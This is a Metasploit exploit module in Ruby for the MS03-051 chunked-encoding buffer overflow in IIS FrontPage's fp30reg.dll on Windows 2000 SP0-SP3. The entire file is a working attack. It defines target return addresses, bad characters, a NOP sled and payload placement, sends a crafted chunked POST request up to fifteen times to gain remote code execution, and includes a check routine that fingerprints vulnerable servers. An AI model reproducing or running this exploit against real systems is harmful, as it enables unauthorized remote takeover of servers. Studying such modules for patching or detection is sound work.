require 'msf/core'

module Msf

class Exploits::Windows::Isapi::IIS_FP30REG_Chunked < Msf::Exploit::Remote

	include Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'IIS FrontPage fp30reg.dll Chunked Overflow',
			'Description'    => %q{
				This is an exploit for the chunked encoding buffer overflow
				described in MS03-051 and originally reported by Brett
				Moore. This particular modules works against versions of
				Windows 2000 between SP0 and SP3. Service Pack 4 fixes the
				issue.
					
			},
			'Author'         => [ 'hdm' ],
			'License'        => GPL_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '2952'],
					[ 'MSB', 'MS03-051'],
					[ 'MIL', '29'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00\x2b\x26\x3d\x25\x0a\x0d\x20",

				},
			'Platform'       => 'win',
			'Targets'        => 
				[
					['Windows 2000 SP0-SP3',  { 'Ret' => 0x6c38a4d0  }],   # from mfc42.dll
					['Windows 2000 07/22/02', { 'Ret' => 0x67d44eb1  }],   # from fp30reg.dll 07/22/2002
					['Windows 2000 10/06/99', { 'Ret' => 0x67d4665d  }],   # from fp30reg.dll 10/06/1999
						
					
				],
			'DisclosureDate' => 'Nov 11 2003',
			'DefaultTarget' => 0))
		
			register_options(
				[
					OptString.new('URL', [ true,  "The path to fp30reg.dll.dll", "/_vti_bin/_vti_aut/fp30reg.dll" ]),
				], self.class)
							
	end

	def exploit
		c = connect

		pat = Rex::Text.rand_text_alphanumeric(0xdead)
		pat[128, 4] = [target.ret].pack('V')
		pat[264, 4] = [target.ret].pack('V')
		pat[160, 7] = "\x2d\xff\xfe\xff\xff" + "\xff\xe0"
		pat[280, 512] = make_nops(512)
		pat[792, payload.encoded.length] = payload.encoded
		
		1.upto(15) do |i|
			
			if (i % 3 == 0)
				print_status("Refreshing the remote DLLHost.exe process...")
				c.send_request(c.request({ 'uri' => datastore['URL'] }),  -1)			
			end
			
			c.connect
			s = c.conn
			
			print_status("Trying to exploit fp30reg.dll (#{i.to_s} of 15)")
			
			req = 
				"POST #{datastore['URL']} HTTP/1.1\r\n" +
				"Host: #{datastore['VHOST'] || datastore['RHOST']}\r\n" +
				"Transfer-Encoding: Chunked\r\n\r\n" +
				"DEAD\r\n" +
				pat + "\r\n" + 
				"0\r\n"
				
			s.put(req)	
			sleep(1)
			
			handler
			disconnect
		end
	end
	
	def check
		c = connect
		print_status("Refreshing the remote DLLHost.exe process...")
		r = c.send_request(c.request({ 'uri' => datastore['URL'] }),  -1)
		disconnect
		
		if (r and r.code == 501)
			return Exploit::CheckCode::Detected
		end
		return Exploit::CheckCode::Safe
	end

end
end	
